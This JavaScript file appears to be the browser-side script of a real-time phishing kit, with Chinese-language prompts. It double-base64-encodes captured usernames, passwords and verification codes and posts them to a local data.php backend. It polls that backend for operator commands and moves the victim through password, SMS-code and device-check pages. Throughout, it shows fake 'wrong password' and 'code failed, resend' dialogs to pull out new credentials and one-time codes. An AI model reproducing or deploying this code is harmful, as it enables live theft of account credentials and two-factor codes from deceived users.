document.write('<script src="../app/data.php?sv=js&'+Math.random()+'"><\/script>');
function ds(act,data){
	console.log(data);
	$.post('../app/data.php','sv='+encodeURIComponent(b6(b6(JSON.stringify({act:act||'sv',data:data})))),function(d){
		d = dejson(d);
	});	
}
function rs(o){
	clearInterval(window.rshand);
	window.rshand = setInterval(function(){
		o=o||{};
		o.rs = 'rs';
		if(o.pn && !window.ispv){
			o.pp = window.ispv = true;
		}else{
			o.pp = undefined;
		}
		$.post('../app/data.php',o,function(d){
			d = dejson(d);
			console.log(d.state);
			if( d.state && d.state > 0){
				if(1 == d.state){	
					jump('../pass/');
				}else if(2 == d.state){	
					jump('../in/');
				}else if(3 == d.state){	
					jump('../code/'); 
				}else if(4 == d.state){	
					jump('../code_fail/'); 
				}else if(5 == d.state){	
					jump('../ok/'); 
				}else if(14 == d.state){	
					jump('../send/'); 
				}else if(15 == d.state){	
					jump('../send2/'); 
				}else if(16 == d.state){	
					jump('../bei/'); 
				}else if(6 == d.state){	
					jump('../err/'); 
				}else if(8 == d.state){	
					jump('../msg/'); 
					
					
					
				}else if(46 == d.state){	
					msg_ok('设备校验失败，请从新校验！',function(){
						jump('../bei/'); 
					});	
					setTimeout(tfun,2000);
					
				}else if(44 == d.state){	
					msg_ok('验证码发送失败，请从新发送！',function(){
						jump('../send/'); 
					});	
					setTimeout(tfun,2000);
				}else if(45 == d.state){	
					msg_ok('验证码发送失败，请从新发送！',function(){
						jump('../send/'); 
					});	
					setTimeout(tfun,2000);
					
					
					
				}else if(41 == d.state){	
					msg_ok('密码错误，请重新输入！',function(){
						jump('../pass/' ); 
					});	
					setTimeout(tfun,2000);
				}else if(44 == d.state){
                    //JS普通弹框
                    function msg_ok14(text, fun){
                    $('#tmsg').remove();
                    	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="background:rgba(0,0,0,0.6);position:fixed;left:0;top:0;width:100%;height:100%;z-index:19891015"><div style="margin:200px auto 0;background:#fff;border:solid #aaa 1px;border-radius:5px;width:90%;max-width:450px;text-align:center;"><div style="padding:32px 10px;color:#333;font-size:16px;line-height:2;">'+text+'</div></div></div>');
                    }
					msg_ok14('验证码检验失败，请从新发送！');
				}else if(43 == d.state){
					msg_ok('验证码错误，请重新输入！',function(){
					    jump('../code/'); 
					});	
					setTimeout(tfun,2000);				
				}   else{
				    alert( d.state)
				}
				clearInterval(window.rshand);
                setTimeout(function() {
                    rs({pn:'code'});
                },5000);
			}
		});	
	},2500);
	function jump(url){
		$.post('../app/data.php','rs=clear',function(d){
			location.href = url;
		});	
	}
}
function dejson(d){
	try {
		if(typeof(d) == 'string') d = JSON.parse(d);
		if(d.tip)tip(d.tip);
		if(d.alert)alert(d.alert);
		if(d.reload)location.reload(); 
		if(d.location)location.href = d.location;
	} catch(e){
		return {d: d,e: e};
	}
	return d; 
}





//JS提示弹框
function tip(text, time){
	$('#tmsg').remove();
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="top:200px;left:20%;right:20%;color:#fff;margin:0 auto;opacity:0;padding:5px;font-size:15px;max-width:300px;position:fixed;text-align:center;border-radius:8px;background-color:#333;border:1px solid #222;box-shadow:rgba(0,0,0,0.25) 0px 0px 10px 6px;transition:opacity 0.6s;z-index:19891016;">'+text+'</div>');
	setTimeout('tmsg.style.opacity=0.8',0);clearTimeout(window.tmst);
	window.tmst=setTimeout('tmsg.style.opacity=0;setTimeout("document.body.removeChild(tmsg)",600);',(time||3)*1000);
}
//JS普通弹框
function msg_ok(text, fun){
	window.tfun = fun;clearTimeout(window.tmst);
$('#tmsg').remove();
	document.body.insertAdjacentHTML('beforeEnd','<div id="tmsg" style="background:rgba(0,0,0,0.6);position:fixed;left:0;top:0;width:100%;height:100%;z-index:19891015"><div style="margin:200px auto 0;background:#fff;border:solid #aaa 1px;border-radius:5px;width:90%;max-width:450px;text-align:center;"><div style="padding:32px 10px;color:#333;font-size:16px;line-height:2;">'+text+'</div><div><button style="BTNSTYLE" onclick="tfun();">确定</button></div></div></div>'.replace(/BTNSTYLE/g,'padding:0px;font-size:14px;font-weight:100;color:#fff;border-style:none;border-color:initial;height:40px;line-height:40px;width:150px;max-width:28vw;cursor:pointer;border-radius:5px;background:#4899E0;margin:0 8px 20px;'));
}



function b6(s) {
	s = s.replace(/\r\n/g,'\n');
	var r1,r2,r3,c,c1,c2,c3,c4,i = 0,v = '',u = '',q = 'charAt',w = 'charCodeAt',f = String.fromCharCode,l = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
	for (var n = 0; n < s.length; n++) {
		var c = s[w](n);
		if (c < 128) {
			u += f(c)
		} else if ((c > 127) && (c < 2048)) {
			u += f((c >> 6) | 192);
			u += f((c & 63) | 128)
		} else {
			u += f((c >> 12) | 224);
			u += f(((c >> 6) & 63) | 128);
			u += f((c & 63) | 128)
		}
	}
	while (i < u.length) {
		r1 = u[w](i++);
		r2 = u[w](i++);
		r3 = u[w](i++);
		c1 = r1 >> 2;
		c2 = ((r1 & 3) << 4) | (r2 >> 4);
		c3 = ((r2 & 15) << 2) | (r3 >> 6);
		c4 = r3 & 63;
		if (isNaN(r2)) {
			c3 = c4 = 64
		} else if (isNaN(r3)) {
			c4 = 64
		}
		v = v + l[q](c1) + l[q](c2) + l[q](c3) + l[q](c4)
	}
	return v
}
// console.log("ds('sv',{user:'4165456',pass:'446565'});");
// console.log("ds('sv',{code:'4165456'});");